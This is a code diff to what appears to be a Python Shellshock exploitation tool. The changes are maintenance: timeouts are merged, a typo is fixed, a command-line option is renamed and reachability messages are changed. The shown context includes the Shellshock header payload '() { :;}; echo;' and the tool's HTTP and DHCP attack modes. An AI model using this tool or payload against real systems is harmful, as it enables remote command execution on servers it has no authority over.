@@ -346,9 +346,6 @@ ATTACKS = [
         "() { :;}; echo;"
    ]
 
-# Timeout for attacks which do no provide an interactive response
-ATTACK_TIMEOUT = 20
-
 # User-agent to use instead of 'Python-urllib/2.6' or similar
 USER_AGENT = "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
 
@@ -358,6 +355,8 @@ def signal_handler(signal, frame):
     """
     sys.exit(0)
 
+# Timeout for urllib2.urlopen requests
+TIMEOUT = 5
 
 ###################
 #
@@ -406,7 +405,7 @@ def check_hosts(host_target_list, port, verbose):
             if verbose: print "[I] Checking to see if %s resolves..." % host
             ipaddr = socket.gethostbyname(host)
             if verbose: print "[I] Resolved ok"
-            if verbose: print "[I] Checking to see if %s is reachable on post %s..." % (host, port)
+            if verbose: print "[I] Checking to see if %s is reachable on port %s..." % (host, port)
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.settimeout(5.0)
             s.connect((ipaddr, int(port)))
@@ -419,8 +418,10 @@ def check_hosts(host_target_list, port, verbose):
     if number_of_targets > 1:
         print "[+] %i of %i targets were reachable" % \
                             (len(confirmed_hosts), number_of_targets)
-    elif len(confirmed_hosts) > 0:
+    elif len(confirmed_hosts) == 1:
         print "[+] Target was reachable"
+    else:
+        print "[+] Target unreachable"
     return confirmed_hosts
 
 
@@ -488,7 +489,7 @@ def do_check_cgi(req, q, verbose):
     """ Worker thread for scan_hosts to check if url is reachable
     """
     try:
-        if urllib2.urlopen(req, None, 5).getcode() == 200:
+        if urllib2.urlopen(req, None, TIMEOUT).getcode() == 200:
             q.put(req.get_full_url())
     except Exception as e:
         if verbose: print "[I] %s for %s" % (e, req.get_full_url()) 
@@ -560,8 +561,7 @@ def do_attack(proxy, target, header, attack, verbose):
             req.set_proxy(proxy, "http")    
             if verbose: print "[I] Proxy set to: %s" % str(proxy)
         req.add_header("Host", host)
-        # Times out if no response within ATTACK_TIMEOUT seconds
-        resp = urllib2.urlopen(req, None, ATTACK_TIMEOUT)
+        resp = urllib2.urlopen(req, None, TIMEOUT)
         result =  resp.read()
     except Exception as e:
         if verbose: print "[I] %s - %s" % (target, e) 
@@ -902,10 +902,10 @@ def main():
         )
     targets = parser.add_mutually_exclusive_group()
     targets.add_argument(
-        '--Hostname',
+        '--Host',
         '-H',
         type = str,
-        help = 'A target host'
+        help = 'A target hostname or IP address'
         )
     targets.add_argument(
         '--file',
@@ -977,8 +977,8 @@ def main():
         do_dhcp_attack(command)
     elif args.Mode == "http":
         print "[+] HTTP ATTACK MODE SELECTED"
-        if args.Hostname:
-            host_target_list = [args.Hostname]
+        if args.Host:
+            host_target_list = [args.Host]
         elif args.file:
             host_target_list = get_targets_from_file(args.file)
         else:
